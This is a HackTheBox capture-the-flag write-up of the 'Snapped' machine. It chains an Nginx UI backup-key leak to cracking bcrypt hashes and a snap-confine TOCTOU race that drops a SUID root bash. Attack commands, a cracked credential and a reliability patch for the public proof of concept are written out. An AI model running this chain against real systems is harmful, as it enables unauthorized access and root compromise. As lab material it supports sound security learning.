---
title: "Snapped — HackTheBox Writeup"
date: 2026-06-19
authors:
  - pexpo
categories:
  - Web Exploitation
  - Linux
tags:
  - hard
  - nginx-ui
  - cve-2026-27944
  - cve-2026-3888
  - snap-confine
  - toctou
  - bcrypt
  - htb
slug: snapped
description: "CVE-2026-27944 Nginx UI unauthenticated backup key leak → bcrypt crack → SSH → CVE-2026-3888 snap-confine TOCTOU race → SUID bash → root"
---

# Snapped — HackTheBox Writeup
**Difficulty:** Hard | **OS:** Linux (Ubuntu 24.04)

<!-- more -->

## Overview

Snapped chains two CVEs: an unauthenticated Nginx UI backup endpoint leaking its own AES key (CVE-2026-27944), and a TOCTOU race between snap-confine and systemd-tmpfiles to inject a malicious dynamic linker as root (CVE-2026-3888).

**Chain:** vhost fuzz → Nginx UI 2.3.2 → `/api/backup` AES key leak → SQLite bcrypt hashes → jonathan:linkinpark → SSH → snap-confine TOCTOU race → SUID bash → root

---

## Vhost Fuzz → CVE-2026-27944

```bash
ffuf -u http://snapped.htb -H "Host: FUZZ.snapped.htb" \
     -w subdomains-top1million-5000.txt -fs 20199
# admin.snapped.htb → Nginx UI 2.3.2
```

No auth needed on `/api/backup` — the AES-256-CBC key and IV come back in `X-Backup-Security`:

```bash
curl -v http://admin.snapped.htb/api/backup -o backup.zip
# X-Backup-Security: <base64-key>:<base64-iv>
```

Decrypt the inner archive, extract `database.db`, dump bcrypt hashes:

```bash
sqlite3 database.db "SELECT username,password FROM users;"
hashcat -m 3200 hashes.txt rockyou.txt
# jonathan:linkinpark
```

---

## CVE-2026-3888 — snap-confine TOCTOU

snapd 2.63.1+24.04, SUID snap-confine. When systemd-tmpfiles deletes `/tmp/.snap`, an unprivileged user recreates it, populates it with a malicious `ld-linux-x86-64.so.2`, and races snap-confine into loading it as root — dropping a SUID bash.

**Cross-compile (ARM Kali → x86-64 target, no gcc on box):**

```bash
apt install gcc-x86-64-linux-gnu -y
x86_64-linux-gnu-gcc -shared -fPIC -nostartfiles -o librootshell.so librootshell_suid.c
x86_64-linux-gnu-gcc -O2 -o exploit exploit_suid.c -lpthread
```

Stock PoC failed at Phase 5 — process died between race win and `copy_file()`. Fix: retry loop with 50ms backoff (20 attempts). After patch:

```bash
/tmp/exploit_patched /tmp/librootshell.so
# [+] SUID root bash: /var/snap/firefox/common/bash
/var/snap/firefox/common/bash -p
cat /root/root.txt
```

---

## Things I Learned

**Leaking the AES key in the response defeats encryption entirely.** The fix for CVE-2026-27944 was trivially obvious in hindsight — never return key material alongside ciphertext.

**TOCTOU in /tmp is reliable without memory corruption.** SUID binaries that trust world-writable paths + a privileged cleanup daemon = a predictable race window.

**Public PoCs need patching.** The retry loop fix came from reading the source and reasoning about why the timing failed. Understanding the code is what separates using a PoC from exploiting a vuln.

---

*Pexpo | HTB | 19 Jun 2026*
